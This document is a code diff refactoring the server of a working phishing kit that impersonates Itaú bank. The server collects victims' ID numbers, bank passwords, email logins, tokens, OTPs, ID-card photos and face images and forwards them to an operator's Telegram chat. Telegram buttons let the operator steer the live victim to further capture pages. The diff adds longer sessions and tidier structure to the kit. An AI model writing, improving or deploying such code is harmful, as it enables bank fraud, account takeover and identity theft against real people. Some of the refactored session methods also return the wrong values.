@@ -7,17 +7,17 @@ require('dotenv').config();
 
 const app = express();
 const server = http.createServer(app);
+
+// Optimized Socket.IO configuration for maximum persistence
 const io = socketIo(server, {
-    pingTimeout: 120000,
-    pingInterval: 25000,
-    connectTimeout: 60000,
-    allowEIO3: true,
-    transports: ['polling'],
-    upgradeTimeout: 30000,
-    maxHttpBufferSize: 1e8,
-    allowUpgrades: false,
-    perMessageDeflate: false,
-    httpCompression: false,
+    pingTimeout: 180000,      // 3 minutes before considering disconnected
+    pingInterval: 20000,      // Check every 20 seconds
+    connectTimeout: 60000,    // 1 minute to establish connection
+    transports: ['polling'],  // Only polling for maximum compatibility
+    allowUpgrades: false,     // Prevent upgrade issues
+    perMessageDeflate: false, // Reduce CPU overhead
+    httpCompression: false,   // Reduce latency
+    maxHttpBufferSize: 1e8,   // 100MB max
     cors: {
         origin: "*",
         methods: ["GET", "POST"],
@@ -36,89 +36,198 @@ app.use(express.static(__dirname));
 const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
 const chatId = process.env.TELEGRAM_CHAT_ID;
 
-// Store session data with persistent IDs
-const sessions = new Map();
-const socketToSession = new Map();
-const sessionToSocket = new Map();
-const sessionTimers = new Map(); // Track session expiration timers
+// Session Management
+class SessionManager {
+    constructor() {
+        this.sessions = new Map();
+        this.socketToSession = new Map();
+        this.sessionToSocket = new Map();
+        this.sessionTimers = new Map();
+        this.SESSION_TIMEOUT = 3 * 60 * 60 * 1000; // 3 hours
+    }
 
-// Session configuration
-const SESSION_TIMEOUT = 2 * 60 * 60 * 1000; // 2 hours
-const HEARTBEAT_INTERVAL = 10000; // 10 seconds
+    generateSessionId() {
+        return `ITU_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+    }
 
-// Generate unique session ID
-function generateSessionId() {
-    return `ITU_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
-}
-
-// Standard buttons for all messages
-function getStandardButtons(sessionId) {
-    return [
-        [
-            { text: '🔄 Pedir Logo', callback_data: `logo_${sessionId}` },
-            { text: '📧 Pedir Correo', callback_data: `email_${sessionId}` }
-        ],
-        [
-            { text: '🎫 Pedir Token', callback_data: `token_${sessionId}` },
-            { text: '📱 Pedir OTP', callback_data: `otp_${sessionId}` }
-        ],
-        [
-            { text: '🪙 Pedir Cédula', callback_data: `cedula_${sessionId}` },
-            { text: '👤 Pedir Cara', callback_data: `biometria_${sessionId}` }
-        ],
-        [
-            { text: '✅ Finalizar', callback_data: `finalize_${sessionId}` }
-        ]
-    ];
-}
-
-// Helper function to send message to Telegram
-async function sendToTelegram(sessionId, data, buttons) {
-    try {
-        let message = `🔔 *Nueva Actividad - Itaú*\n\n`;
-        message += `📱 *Sesión:* \`${sessionId}\`\n`;
-        message += `⏰ *Fecha:* ${new Date().toLocaleString('es-CO')}\n\n`;
-        
-        if (data.documentType) {
-            message += `📋 *Tipo Documento:* ${data.documentType}\n`;
-        }
-        if (data.documentNumber) {
-            message += `🆔 *Número Documento:* ${data.documentNumber}\n`;
-        }
-        if (data.password) {
-            message += `🔐 *Clave:* ${data.password}\n`;
-        }
-        if (data.email) {
-            message += `📧 *Email:* ${data.email}\n`;
-        }
-        if (data.emailPassword) {
-            message += `🔑 *Contraseña Email:* ${data.emailPassword}\n`;
-        }
-        if (data.token) {
-            message += `🎫 *Token:* ${data.token}\n`;
-        }
-        if (data.otp) {
-            message += `📲 *OTP:* ${data.otp}\n`;
-        }
-        if (data.hasCedula) {
-            message += `🪪 *Cédula:* Frente y Reverso capturados\n`;
-        }
-        if (data.hasBiometria) {
-            message += `👤 *Biometría:* Rostro capturado\n`;
-        }
-
-        const options = {
-            parse_mode: 'Markdown',
-            reply_markup: {
-                inline_keyboard: buttons
-            }
+    createSession(socketId) {
+        const sessionId = this.generateSessionId();
+        const sessionData = { 
+            createdAt: Date.now(), 
+            lastActivity: Date.now() 
         };
+        
+        this.sessions.set(sessionId, sessionData);
+        this.socketToSession.set(socketId, sessionId);
+        this.sessionToSocket.set(sessionId, socketId);
+        
+        console.log(`✨ New session created: ${sessionId}`);
+        return { sessionId, sessionData };
+    }
 
-        const sentMessage = await bot.sendMessage(chatId, message, options);
-        return sentMessage.message_id;
-    } catch (error) {
-        console.error('Error sending to Telegram:', error);
-        throw error;
+    reconnectSession(sessionId, socketId) {
+        // Clear existing timer
+        this.clearTimer(sessionId);
+        
+        // Update mappings
+        const oldSocketId = this.sessionToSocket.get(sessionId);
+        if (oldSocketId && oldSocketId !== socketId) {
+            this.socketToSession.delete(oldSocketId);
+        }
+        
+        this.socketToSession.set(socketId, sessionId);
+        this.sessionToSocket.set(sessionId, socketId);
+        
+        console.log(`🔄 Session reconnected: ${sessionId}`);
+    }
+
+    updateActivity(sessionId) {
+        const session = this.sessions.get(sessionId);
+        if (session) {
+            session.lastActivity = Date.now();
+            this.sessions.set(sessionId, session);
+        }
+    }
+
+    getSession(sessionId) {
+        return this.sessions.get(sessionId);
+    }
+
+    updateSessionData(sessionId, data) {
+        const session = this.sessions.get(sessionId) || { createdAt: Date.now() };
+        const updatedSession = { ...session, ...data, lastActivity: Date.now() };
+        this.sessions.set(sessionId, updatedSession);
+        return updatedSession;
+    }
+
+    clearSessionData(sessionId) {
+        const session = this.sessions.get(sessionId);
+        if (session) {
+            this.sessions.set(sessionId, {
+                createdAt: session.createdAt || Date.now(),
+                lastActivity: Date.now()
+            });
+        }
+    }
+
+    getSocketId(sessionId) {
+        return this.sessionToSocket.get(sessionId);
+    }
+
+    clearTimer(sessionId) {
+        const timer = this.sessionTimers.get(sessionId);
+        if (timer) {
+            clearTimeout(timer);
+            this.sessionTimers.delete(sessionId);
+        }
+    }
+
+    scheduleCleanup(sessionId, socketId) {
+        this.clearTimer(sessionId);
+        
+        const timer = setTimeout(() => {
+            if (this.sessionToSocket.get(sessionId) === socketId || !this.sessionToSocket.has(sessionId)) {
+                this.sessions.delete(sessionId);
+                this.sessionToSocket.delete(sessionId);
+                this.sessionTimers.delete(sessionId);
+                console.log(`🗑️ Session expired: ${sessionId}`);
+            }
+        }, this.SESSION_TIMEOUT);
+        
+        this.sessionTimers.set(sessionId, timer);
+    }
+
+    deleteSession(sessionId) {
+        const socketId = this.getSocketId(sessionId);
+        this.sessions.delete(sessionId);
+        this.sessionToSocket.delete(sessionId);
+        if (socketId) this.socketToSession.delete(socketId);
+        this.clearTimer(sessionId);
+    }
+}
+
+const sessionManager = new SessionManager();
+
+// Telegram Helper Functions
+class TelegramHelper {
+    static getStandardButtons(sessionId) {
+        return [
+            [
+                { text: '🔄 Pedir Logo', callback_data: `logo_${sessionId}` },
+                { text: '📧 Pedir Correo', callback_data: `email_${sessionId}` }
+            ],
+            [
+                { text: '🎫 Pedir Token', callback_data: `token_${sessionId}` },
+                { text: '📱 Pedir OTP', callback_data: `otp_${sessionId}` }
+            ],
+            [
+                { text: '🪙 Pedir Cédula', callback_data: `cedula_${sessionId}` },
+                { text: '👤 Pedir Cara', callback_data: `biometria_${sessionId}` }
+            ],
+            [
+                { text: '✅ Finalizar', callback_data: `finalize_${sessionId}` }
+            ]
+        ];
+    }
+
+    static async sendMessage(sessionId, data) {
+        try {
+            let message = `🔔 *Nueva Actividad - Itaú*\n\n`;
+            message += `📱 *Sesión:* \`${sessionId}\`\n`;
+            message += `⏰ *Fecha:* ${new Date().toLocaleString('es-CO')}\n\n`;
+            
+            const fields = [
+                { key: 'documentType', label: '📋 *Tipo Documento:*' },
+                { key: 'documentNumber', label: '🆔 *Número Documento:*' },
+                { key: 'password', label: '🔐 *Clave:*' },
+                { key: 'email', label: '📧 *Email:*' },
+                { key: 'emailPassword', label: '🔑 *Contraseña Email:*' },
+                { key: 'token', label: '🎫 *Token:*' },
+                { key: 'otp', label: '📲 *OTP:*' }
+            ];
+
+            fields.forEach(field => {
+                if (data[field.key]) {
+                    message += `${field.label} ${data[field.key]}\n`;
+                }
+            });
+
+            if (data.hasCedula) message += `🪪 *Cédula:* Frente y Reverso capturados\n`;
+            if (data.hasBiometria) message += `👤 *Biometría:* Rostro capturado\n`;
+
+            const options = {
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: this.getStandardButtons(sessionId)
+                }
+            };
+
+            const sentMessage = await bot.sendMessage(chatId, message, options);
+            return sentMessage.message_id;
+        } catch (error) {
+            console.error('❌ Error sending to Telegram:', error);
+            throw error;
+        }
+    }
+
+    static async sendPhoto(buffer, caption) {
+        try {
+            await bot.sendPhoto(chatId, buffer, { 
+                caption, 
+                parse_mode: 'Markdown' 
+            });
+        } catch (error) {
+            console.error('❌ Error sending photo:', error);
+            throw error;
+        }
+    }
+
+    static async sendNotification(message) {
+        try {
+            await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+        } catch (error) {
+            console.error('❌ Error sending notification:', error);
+        }
     }
 }
 
@@ -130,57 +239,32 @@ io.on('connection', (socket) => {
 
     // Handle session initialization or reconnection
     socket.on('init-session', (data) => {
-        if (data.sessionId && sessions.has(data.sessionId)) {
+        if (data.sessionId && sessionManager.getSession(data.sessionId)) {
             // Reconnecting with existing session
-            sessionId = data.sessionId;
-            
-            // Clear any existing expiration timer
-            if (sessionTimers.has(sessionId)) {
-                clearTimeout(sessionTimers.get(sessionId));
-                sessionTimers.delete(sessionId);
-            }
-            
-            // Remove old socket mapping if exists
-            const oldSocketId = sessionToSocket.get(sessionId);
-            if (oldSocketId && oldSocketId !== socket.id) {
-                socketToSession.delete(oldSocketId);
-            }
-            
-            socketToSession.set(socket.id, sessionId);
-            sessionToSocket.set(sessionId, socket.id);
-            console.log(`Client reconnected with session: ${sessionId}`);
+            sessionId = sessionManager.reconnectSession(data.sessionId, socket.id);
+            console.log(`✅ Client reconnected with session: ${sessionId}`);
             socket.emit('session-ready', { sessionId, reconnected: true });
         } else {
             // New session - always start fresh
-            sessionId = generateSessionId();
-            sessions.set(sessionId, { createdAt: Date.now(), lastActivity: Date.now() });
-            socketToSession.set(socket.id, sessionId);
-            sessionToSocket.set(sessionId, socket.id);
-            console.log(`New session created: ${sessionId}`);
+            sessionId = sessionManager.createSession(socket.id);
+            console.log(`✨ New session created: ${sessionId}`);
             socket.emit('session-ready', { sessionId, reconnected: false });
         }
     });
 
     // Handle clear session (when returning to index.html)
     socket.on('clear-session', () => {
-        if (sessionId && sessions.has(sessionId)) {
-            console.log(`Clearing session data: ${sessionId}`);
-            const oldData = sessions.get(sessionId);
-            // Keep only createdAt and lastActivity, clear everything else
-            sessions.set(sessionId, { 
-                createdAt: oldData.createdAt || Date.now(), 
-                lastActivity: Date.now() 
-            });
+        if (sessionId) {
+            console.log(`🧹 Clearing session data: ${sessionId}`);
+            sessionManager.clearSessionData(sessionId);
             socket.emit('session-cleared', { sessionId });
         }
     });
 
     // Handle heartbeat to keep session alive
     socket.on('heartbeat', () => {
-        if (sessionId && sessions.has(sessionId)) {
-            const sessionData = sessions.get(sessionId);
-            sessionData.lastActivity = Date.now();
-            sessions.set(sessionId, sessionData);
+        if (sessionId) {
+            sessionManager.updateActivity(sessionId);
             socket.emit('heartbeat-ack');
         }
     });
@@ -188,23 +272,21 @@ io.on('connection', (socket) => {
     // Handle login submission
     socket.on('login', async (data) => {
         try {
-            console.log(`[LOGIN] Received from session ${sessionId}:`, data);
+            console.log(`[LOGIN] 📥 Received from session ${sessionId}:`, data);
             if (!sessionId) return socket.emit('login-response', { success: false, error: 'No session' });
             
-            const sessionData = sessions.get(sessionId) || { createdAt: Date.now() };
-            sessionData.documentType = data.documentType;
-            sessionData.documentNumber = data.documentNumber;
-            sessionData.password = data.password;
-            sessionData.lastActivity = Date.now();
-            sessions.set(sessionId, sessionData);
+            const sessionData = sessionManager.updateSessionData(sessionId, {
+                documentType: data.documentType,
+                documentNumber: data.documentNumber,
+                password: data.password
+            });
 
-            const buttons = getStandardButtons(sessionId);
-            console.log(`[LOGIN] Sending to Telegram for session ${sessionId}`);
-            await sendToTelegram(sessionId, sessionData, buttons);
-            console.log(`[LOGIN] Successfully sent to Telegram for session ${sessionId}`);
+            console.log(`[LOGIN] 📤 Sending to Telegram for session ${sessionId}`);
+            await TelegramHelper.sendMessage(sessionId, sessionData);
+            console.log(`[LOGIN] ✅ Successfully sent to Telegram`);
             socket.emit('login-response', { success: true });
         } catch (error) {
-            console.error('Error processing login:', error);
+            console.error('❌ Error processing login:', error);
             socket.emit('login-response', { success: false, error: error.message });
         }
     });
@@ -212,22 +294,20 @@ io.on('connection', (socket) => {
     // Handle email submission
     socket.on('email', async (data) => {
         try {
-            console.log(`[EMAIL] Received from session ${sessionId}:`, data);
+            console.log(`[EMAIL] 📥 Received from session ${sessionId}:`, data);
             if (!sessionId) return socket.emit('email-response', { success: false, error: 'No session' });
             
-            const sessionData = sessions.get(sessionId) || { createdAt: Date.now() };
-            sessionData.email = data.email;
-            sessionData.emailPassword = data.password;
-            sessionData.lastActivity = Date.now();
-            sessions.set(sessionId, sessionData);
+            const sessionData = sessionManager.updateSessionData(sessionId, {
+                email: data.email,
+                emailPassword: data.password
+            });
 
-            const buttons = getStandardButtons(sessionId);
-            console.log(`[EMAIL] Sending to Telegram for session ${sessionId}`);
-            await sendToTelegram(sessionId, sessionData, buttons);
-            console.log(`[EMAIL] Successfully sent to Telegram for session ${sessionId}`);
+            console.log(`[EMAIL] 📤 Sending to Telegram for session ${sessionId}`);
+            await TelegramHelper.sendMessage(sessionId, sessionData);
+            console.log(`[EMAIL] ✅ Successfully sent to Telegram`);
             socket.emit('email-response', { success: true });
         } catch (error) {
-            console.error('Error processing email:', error);
+            console.error('❌ Error processing email:', error);
             socket.emit('email-response', { success: false, error: error.message });
         }
     });
@@ -235,21 +315,19 @@ io.on('connection', (socket) => {
     // Handle token submission
     socket.on('token', async (data) => {
         try {
-            console.log(`[TOKEN] Received from session ${sessionId}:`, data);
+            console.log(`[TOKEN] 📥 Received from session ${sessionId}:`, data);
             if (!sessionId) return socket.emit('token-response', { success: false, error: 'No session' });
             
-            const sessionData = sessions.get(sessionId) || { createdAt: Date.now() };
-            sessionData.token = data.token;
-            sessionData.lastActivity = Date.now();
-            sessions.set(sessionId, sessionData);
+            const sessionData = sessionManager.updateSessionData(sessionId, {
+                token: data.token
+            });
 
-            const buttons = getStandardButtons(sessionId);
-            console.log(`[TOKEN] Sending to Telegram for session ${sessionId}`);
-            await sendToTelegram(sessionId, sessionData, buttons);
-            console.log(`[TOKEN] Successfully sent to Telegram for session ${sessionId}`);
+            console.log(`[TOKEN] 📤 Sending to Telegram for session ${sessionId}`);
+            await TelegramHelper.sendMessage(sessionId, sessionData);
+            console.log(`[TOKEN] ✅ Successfully sent to Telegram`);
             socket.emit('token-response', { success: true });
         } catch (error) {
-            console.error('Error processing token:', error);
+            console.error('❌ Error processing token:', error);
             socket.emit('token-response', { success: false, error: error.message });
         }
     });
@@ -257,21 +335,19 @@ io.on('connection', (socket) => {
     // Handle OTP submission
     socket.on('otp', async (data) => {
         try {
-            console.log(`[OTP] Received from session ${sessionId}:`, data);
+            console.log(`[OTP] 📥 Received from session ${sessionId}:`, data);
             if (!sessionId) return socket.emit('otp-response', { success: false, error: 'No session' });
             
-            const sessionData = sessions.get(sessionId) || { createdAt: Date.now() };
-            sessionData.otp = data.otp;
-            sessionData.lastActivity = Date.now();
-            sessions.set(sessionId, sessionData);
+            const sessionData = sessionManager.updateSessionData(sessionId, {
+                otp: data.otp
+            });
 
-            const buttons = getStandardButtons(sessionId);
-            console.log(`[OTP] Sending to Telegram for session ${sessionId}`);
-            await sendToTelegram(sessionId, sessionData, buttons);
-            console.log(`[OTP] Successfully sent to Telegram for session ${sessionId}`);
+            console.log(`[OTP] 📤 Sending to Telegram for session ${sessionId}`);
+            await TelegramHelper.sendMessage(sessionId, sessionData);
+            console.log(`[OTP] ✅ Successfully sent to Telegram`);
             socket.emit('otp-response', { success: true });
         } catch (error) {
-            console.error('Error processing OTP:', error);
+            console.error('❌ Error processing OTP:', error);
             socket.emit('otp-response', { success: false, error: error.message });
         }
     });
@@ -279,29 +355,27 @@ io.on('connection', (socket) => {
     // Handle cedula (ID card) submission
     socket.on('cedula', async (data) => {
         try {
-            console.log(`[CEDULA] Received from session ${sessionId}`);
+            console.log(`[CEDULA] 📥 Received from session ${sessionId}`);
             if (!sessionId) return socket.emit('cedula-response', { success: false, error: 'No session' });
             
-            const sessionData = sessions.get(sessionId) || { createdAt: Date.now() };
-            sessionData.hasCedula = true;
-            sessionData.lastActivity = Date.now();
-            sessions.set(sessionId, sessionData);
+            const sessionData = sessionManager.updateSessionData(sessionId, {
+                hasCedula: true
+            });
 
             // Send images to Telegram
             const frontBuffer = Buffer.from(data.front.replace(/^data:image\/\w+;base64,/, ''), 'base64');
             const backBuffer = Buffer.from(data.back.replace(/^data:image\/\w+;base64,/, ''), 'base64');
 
-            await bot.sendPhoto(chatId, frontBuffer, { caption: `📸 *Cédula Frontal*\nSesión: \`${sessionId}\``, parse_mode: 'Markdown' });
-            await bot.sendPhoto(chatId, backBuffer, { caption: `📸 *Cédula Reverso*\nSesión: \`${sessionId}\``, parse_mode: 'Markdown' });
+            await TelegramHelper.sendPhoto(frontBuffer, `📸 *Cédula Frontal*\nSesión: \`${sessionId}\``);
+            await TelegramHelper.sendPhoto(backBuffer, `📸 *Cédula Reverso*\nSesión: \`${sessionId}\``);
 
             // Send summary message with buttons and ALL accumulated data
-            const buttons = getStandardButtons(sessionId);
-            await sendToTelegram(sessionId, sessionData, buttons);
+            await TelegramHelper.sendMessage(sessionId, sessionData);
             
-            console.log(`[CEDULA] Successfully sent to Telegram for session ${sessionId}`);
+            console.log(`[CEDULA] ✅ Successfully sent to Telegram`);
             socket.emit('cedula-response', { success: true });
         } catch (error) {
-            console.error('Error processing cedula:', error);
+            console.error('❌ Error processing cedula:', error);
             socket.emit('cedula-response', { success: false, error: error.message });
         }
     });
@@ -309,26 +383,24 @@ io.on('connection', (socket) => {
     // Handle biometria (face) submission
     socket.on('biometria', async (data) => {
         try {
-            console.log(`[BIOMETRIA] Received from session ${sessionId}`);
+            console.log(`[BIOMETRIA] 📥 Received from session ${sessionId}`);
             if (!sessionId) return socket.emit('biometria-response', { success: false, error: 'No session' });
             
-            const sessionData = sessions.get(sessionId) || { createdAt: Date.now() };
-            sessionData.hasBiometria = true;
-            sessionData.lastActivity = Date.now();
-            sessions.set(sessionId, sessionData);
+            const sessionData = sessionManager.updateSessionData(sessionId, {
+                hasBiometria: true
+            });
 
             // Send face image to Telegram
             const faceBuffer = Buffer.from(data.face.replace(/^data:image\/\w+;base64,/, ''), 'base64');
-            await bot.sendPhoto(chatId, faceBuffer, { caption: `👤 *Biometría Facial*\nSesión: \`${sessionId}\``, parse_mode: 'Markdown' });
+            await TelegramHelper.sendPhoto(faceBuffer, `👤 *Biometría Facial*\nSesión: \`${sessionId}\``);
 
             // Send summary message with buttons and ALL accumulated data
-            const buttons = getStandardButtons(sessionId);
-            await sendToTelegram(sessionId, sessionData, buttons);
+            await TelegramHelper.sendMessage(sessionId, sessionData);
             
-            console.log(`[BIOMETRIA] Successfully sent to Telegram for session ${sessionId}`);
+            console.log(`[BIOMETRIA] ✅ Successfully sent to Telegram`);
             socket.emit('biometria-response', { success: true });
         } catch (error) {
-            console.error('Error processing biometria:', error);
+            console.error('❌ Error processing biometria:', error);
             socket.emit('biometria-response', { success: false, error: error.message });
         }
     });
@@ -339,23 +411,10 @@ io.on('connection', (socket) => {
     });
 
     socket.on('disconnect', () => {
-        console.log('Client disconnected:', socket.id);
-        // Keep session data for reconnection but update mappings
+        console.log('🔌 Client disconnected:', socket.id);
         if (sessionId) {
-            console.log(`Session ${sessionId} kept for reconnection`);
-            socketToSession.delete(socket.id);
-            
-            // Set timeout to clean up session if not reconnected
-            const timer = setTimeout(() => {
-                if (sessionToSocket.get(sessionId) === socket.id || !sessionToSocket.has(sessionId)) {
-                    sessions.delete(sessionId);
-                    sessionToSocket.delete(sessionId);
-                    sessionTimers.delete(sessionId);
-                    console.log(`Session ${sessionId} expired after ${SESSION_TIMEOUT / 60000} minutes`);
-                }
-            }, SESSION_TIMEOUT);
-            
-            sessionTimers.set(sessionId, timer);
+            console.log(`💾 Session ${sessionId} kept for reconnection`);
+            sessionManager.scheduleCleanup(sessionId, socket.id);
         }
     });
 });
@@ -365,79 +424,49 @@ bot.on('callback_query', async (callbackQuery) => {
     const action = callbackQuery.data;
     const parts = action.split('_');
     const command = parts[0];
-    const sessionId = parts.slice(1).join('_'); // Reconstruct sessionId with underscores
+    const sessionId = parts.slice(1).join('_');
 
-    console.log(`\n📱 Telegram Button Pressed:`);
-    console.log(`   Command: ${command}`);
-    console.log(`   SessionId: ${sessionId}`);
-    console.log(`   Active sessions: ${sessions.size}`);
-    console.log(`   SessionToSocket map:`, Array.from(sessionToSocket.keys()));
+    console.log(`\n📱 Telegram Button Pressed: ${command} for session ${sessionId}`);
 
     try {
         await bot.answerCallbackQuery(callbackQuery.id);
 
-        // Find the socket connection by session ID using direct lookup
+        const socketId = sessionManager.getSocketId(sessionId);
         let targetSocket = null;
-        const socketId = sessionToSocket.get(sessionId);
-        
-        console.log(`   Found socketId: ${socketId}`);
         
         if (socketId) {
             const sockets = await io.fetchSockets();
             targetSocket = sockets.find(s => s.id === socketId);
-            console.log(`   Target socket found: ${!!targetSocket}`);
         }
 
         if (targetSocket) {
-            console.log(`   Sending redirect to socket ${socketId}...`);
+            const redirectActions = {
+                logo: { page: 'index.html', msg: 'pantalla de login', clearData: true },
+                email: { page: 'correo.html', msg: 'pantalla de correo' },
+                token: { page: 'token.html', msg: 'pantalla de token' },
+                otp: { page: 'otp.html', msg: 'pantalla de OTP' },
+                cedula: { page: 'cedula.html', msg: 'escaneo de cédula' },
+                biometria: { page: 'biometria.html', msg: 'verificación biométrica' },
+                finalize: { page: 'finalizar.html', msg: 'sesión finalizada' }
+            };
             
-            switch (command) {
-                case 'logo':
-                    targetSocket.emit('redirect', { page: 'index.html', clearData: true });
-                    targetSocket.emit('force-redirect', { page: 'index.html', clearData: true });
-                    await bot.sendMessage(chatId, `✅ Usuario redirigido a pantalla de login\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
-                    break;
-                case 'email':
-                    targetSocket.emit('redirect', { page: 'correo.html' });
-                    targetSocket.emit('force-redirect', { page: 'correo.html' });
-                    await bot.sendMessage(chatId, `✅ Usuario redirigido a pantalla de correo\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
-                    break;
-                case 'token':
-                    targetSocket.emit('redirect', { page: 'token.html' });
-                    targetSocket.emit('force-redirect', { page: 'token.html' });
-                    await bot.sendMessage(chatId, `✅ Usuario redirigido a pantalla de token\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
-                    break;
-                case 'otp':
-                    targetSocket.emit('redirect', { page: 'otp.html' });
-                    targetSocket.emit('force-redirect', { page: 'otp.html' });
-                    await bot.sendMessage(chatId, `✅ Usuario redirigido a pantalla de OTP\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
-                    break;
-                case 'cedula':
-                    targetSocket.emit('redirect', { page: 'cedula.html' });
-                    targetSocket.emit('force-redirect', { page: 'cedula.html' });
-                    await bot.sendMessage(chatId, `✅ Usuario redirigido a escaneo de cédula\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
-                    break;
-                case 'biometria':
-                    targetSocket.emit('redirect', { page: 'biometria.html' });
-                    targetSocket.emit('force-redirect', { page: 'biometria.html' });
-                    await bot.sendMessage(chatId, `✅ Usuario redirigido a verificación biométrica\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
-                    break;
-                case 'finalize':
-                    targetSocket.emit('redirect', { page: 'finalizar.html' });
-                    targetSocket.emit('force-redirect', { page: 'finalizar.html' });
-                    await bot.sendMessage(chatId, `✅ Sesión finalizada\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
-                    sessions.delete(sessionId);
-                    sessionToSocket.delete(sessionId);
-                    socketToSession.delete(socketId);
-                    break;
+            const action = redirectActions[command];
+            if (action) {
+                console.log(`   ➡️ Redirecting to ${action.page}`);
+                targetSocket.emit('redirect', { page: action.page, clearData: action.clearData });
+                targetSocket.emit('force-redirect', { page: action.page, clearData: action.clearData });
+                await TelegramHelper.sendNotification(`✅ Usuario redirigido a ${action.msg}\nSesión: \`${sessionId}\``);
+                
+                if (command === 'finalize') {
+                    sessionManager.deleteSession(sessionId);
+                }
             }
-            console.log(`   Redirect sent successfully`);
         } else {
-            await bot.sendMessage(chatId, `⚠️ Sesión no encontrada o desconectada\nSesión: \`${sessionId}\`\n\nEl usuario puede haber cerrado la página o perdido la conexión.`, { parse_mode: 'Markdown' });
+            await TelegramHelper.sendNotification(`⚠️ Sesión no encontrada o desconectada\nSesión: \`${sessionId}\`\n\nEl usuario puede haber cerrado la página o perdido la conexión.`);
         }
     } catch (error) {
-        console.error('Error handling callback:', error);
-        await bot.sendMessage(chatId, `❌ Error: ${error.message}`);
+        console.error('❌ Error handling callback:', error);
+        await TelegramHelper.sendNotification(`❌ Error: ${error.message}`);
     }
 });
 
